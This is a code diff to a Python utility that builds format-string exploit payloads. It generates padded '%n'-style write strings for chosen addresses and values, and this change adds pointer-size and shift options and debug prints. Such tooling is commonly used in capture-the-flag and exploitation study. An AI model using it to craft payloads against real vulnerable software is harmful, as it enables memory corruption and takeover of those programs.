@@ -86,7 +86,7 @@ def whr_pss(inp):
 
     for x in range(HX_len):
         arr = chr(int(HX[2*x:2*(x+1)], 16))
-        print()
+        # print()
 
 
 # Format string design
@@ -106,7 +106,7 @@ def cprinter(what):
 
 
 # The mistic function that house the magic of binary relm
-def writer(c2print, steps, param_offset, ptr_size):
+def writer(c2print, steps, param_offset, ptr_size=8):
     pld = ""
     if steps == 4:
         bytes2write = ""
@@ -121,11 +121,12 @@ def writer(c2print, steps, param_offset, ptr_size):
 
     expected_length = len_c2print + \
         len(c2print) * (len(bytes2write) + 3 + len(str(param_offset)))
+    # print(expected_length)
 
     while True:
         padding = ""
         next_param = param_offset
-        while(expected_length % 8 != 0):
+        while(expected_length % ptr_size != 0):
             padding += "A"
             expected_length += 1
 
@@ -143,6 +144,8 @@ def writer(c2print, steps, param_offset, ptr_size):
         if expected_length != len(pld):
             expected_length = len(pld) - len(padding)
         else:
+            # print(len(pld))
+            # print(pld)
             return pld
 
 # takes care of size of given input and extra padding
@@ -176,7 +179,7 @@ def prep_bytes(what, steps):
     return final, order
 
 
-def write(content,  param_offset, context="compact", platform="amd64"):
+def write(content,  param_offset,  shift=0, context="compact", platform="amd64"):
     what = list(content.values())
     where = list(content.keys())
     addr = sanitize_where(where)
@@ -201,10 +204,15 @@ def write(content,  param_offset, context="compact", platform="amd64"):
         steps = 2
 
     final, order = prep_bytes(what, steps)
+    print(final)
+    min_final = min(final)
+    for x in range(len(final)):
+        final[x] = final[x] - shift
 
     final = cprinter(final)
 
     fmt = writer(final, steps, param_offset, ptr_size)
+    fmt += '_'*(shift % ptr_size)
     # print("=> " + fmt)
     fmt = fmt.encode()
 
@@ -229,6 +237,7 @@ def write(content,  param_offset, context="compact", platform="amd64"):
         # print("-------\n")
 
         fmt += pack(addr[marker] + steps * (max_splits - x[0]))
+        # fmt += b" " + hex(addr[marker] + steps * (max_splits - x[0])).encode()
 
     return fmt
 
